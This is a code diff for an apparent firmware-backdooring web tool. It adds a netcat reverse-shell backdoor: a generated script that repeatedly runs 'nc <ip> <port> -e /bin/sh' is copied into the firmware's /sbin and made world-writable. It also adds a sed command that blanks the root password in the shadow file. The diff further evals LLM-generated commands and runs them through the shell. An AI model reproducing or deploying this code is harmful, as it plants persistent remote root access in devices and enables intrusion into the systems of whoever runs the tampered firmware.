@@ -3,6 +3,7 @@ import os
 import uuid
 import subprocess
 import json
+import re
 from dotenv import load_dotenv
 from llm import get_llm_response
 
@@ -15,6 +16,7 @@ os.makedirs(UPLOAD_DIR, exist_ok=True)
 def initialize_session_state():
     default_states = {
         "button_clicked": None,
+        "button_clicked_nc": None,
         "setting_paths": None,
         "binary_paths": None,
         "user_dir": None,
@@ -22,6 +24,8 @@ def initialize_session_state():
         "squashfs_lines": None,
         "jffs2_lines": None,
         "shadow_path": None,
+        "nc_ip": None,
+        "nc_port": None,
     }
 
     for key, default_value in default_states.items():
@@ -60,6 +64,10 @@ def file_copy(src_path, dst_path):
     subprocess.run(["cp", src_path, dst_path], check=True)
 
 
+def chmod_all(path):
+    subprocess.run(["chmod", "777", path], check=True)
+
+
 def save_uploaded_file(upload_file, user_id):
     directory_clean(f'{UPLOAD_DIR}/{user_id}')
 
@@ -87,6 +95,10 @@ def dump_fs(file_path, output_path, offset, size=None):
 
 def button_click_callback(key):
     st.session_state.button_clicked = key
+
+
+def button_click_nc_callback():
+    st.session_state.button_clicked_nc = True
 
 
 def check_missing_files(file_path):
@@ -216,13 +228,14 @@ def overwrite_fs(src_path, start_byte, end_byte, dst_path):
     overwrite_length = len(src_data)
     if overwrite_length > overwrite_length_check:
         print('Filesystem to overwrite is larger than the existing one.')
+        return -1
 
     length = min(overwrite_length, overwrite_length_check)
     with open(dst_path, 'rb+') as target_file:
         target_file.seek(start_byte)
         target_file.write(src_data[:length])
-
     print(f"Overwritten {length} bytes from {start_byte} to {start_byte + length} in {dst_path}.")
+    return 0
 
 
 def check_mount_strings(user_dir, boot_scripts):
@@ -297,6 +310,57 @@ def backdoor_telnetd():
                 subprocess.run(command, check=True) 
             except subprocess.CalledProcessError as e:
                 pass
+    else:
+        try:
+            command = f"sed -i 's/^root:[^:]*:/root::/' {user_dir}/{setting_paths['shadow']}"
+            subprocess.run(command, shell=True, check=True) 
+        except subprocess.CalledProcessError as e:
+            pass
+
+
+def backdoor_scirpt(ip, port):
+    user_dir = st.session_state.user_dir
+    script_lines = [
+        "#!/bin/sh",
+        "",
+        f"remoteip={ip}",
+        f"port={port}",
+        "",
+        "while :",
+        "do",
+        "    nc $remoteip $port -e /bin/sh &",
+        "    sleep 30",
+        "done"
+    ]
+
+    sh_file_path = f"{user_dir}/backdoor.sh"
+
+    with open(sh_file_path, "w") as file:
+        for line in script_lines:
+            file.write(line + "\n")
+    
+    return sh_file_path
+
+
+def backdoor_nc(ip, port):
+    setting_paths = st.session_state.setting_paths
+    binary_paths = st.session_state.binary_paths
+    user_dir = st.session_state.user_dir
+
+    sh_path = backdoor_scirpt(ip, port)
+    dst_path =f'{user_dir}/rootfs/squashfs-root-0/sbin/backdoor.sh'
+    file_copy(sh_path, dst_path)
+    chmod_all(dst_path)
+
+    commands = get_llm_response(5, None, setting_paths, binary_paths, user_dir, None)
+    commands = eval(commands)
+    print(f'llm response - commands : {commands}')
+    
+    for command in commands:
+        try:
+            subprocess.run(command, shell=True, check=True)  
+        except subprocess.CalledProcessError as e:
+            pass
 
 
 def firmware_repackaging():
@@ -314,7 +378,8 @@ def firmware_repackaging():
     for fs_path in modified_fs:
         modifyfs = f"{user_dir}/{fs_path}-patched"
         start_byte, end_byte = fs_size[f'squashfs-root-{fs_path[-1]}']
-        overwrite_fs(modifyfs, start_byte, end_byte, file_dst)
+        if overwrite_fs(modifyfs, start_byte, end_byte, file_dst):
+            st.stop()
 
     file_name = file_dst.split("/")[-1] 
     file_data = read_file(file_dst)
@@ -413,8 +478,20 @@ if st.session_state.get("button_clicked"):
         backdoor_telnetd()
         st.success(f'Filesystem modification complete!')
     elif st.session_state.button_clicked == "nc":
-        st.warning(f"The selected backdoor type '{st.session_state.button_clicked}' is not yet implemented.")
-        st.stop()
+        if st.session_state.button_clicked_nc == None:
+            st.session_state.nc_ip = st.text_input("Enter the IP for reverse shell connection:", key="ip_input")
+            st.session_state.nc_port = st.text_input("Enter the port for reverse shell connection:", key="port_input")
+            st.button("Send", disabled=False, on_click=button_click_nc_callback)
+            st.stop()
+        elif st.session_state.button_clicked_nc == True:
+            ip, port = st.session_state.nc_ip, st.session_state.nc_port
+            if ip and port:
+                backdoor_nc(ip, port)
+                st.info(f'If the `-e` option is not available in `nc`, the reverse shell may fail to connect.')
+                st.success(f'Filesystem modification complete!')   
+            else:
+                st.error("Please enter both IP and port.")
+                st.stop()
     elif st.session_state.button_clicked == "socat":
         st.warning(f"The selected backdoor type '{st.session_state.button_clicked}' is not yet implemented.")
         st.stop()
@@ -434,4 +511,3 @@ if st.session_state.get("button_clicked"):
             file_name=name,
             mime="application/octet-stream",
     )
-
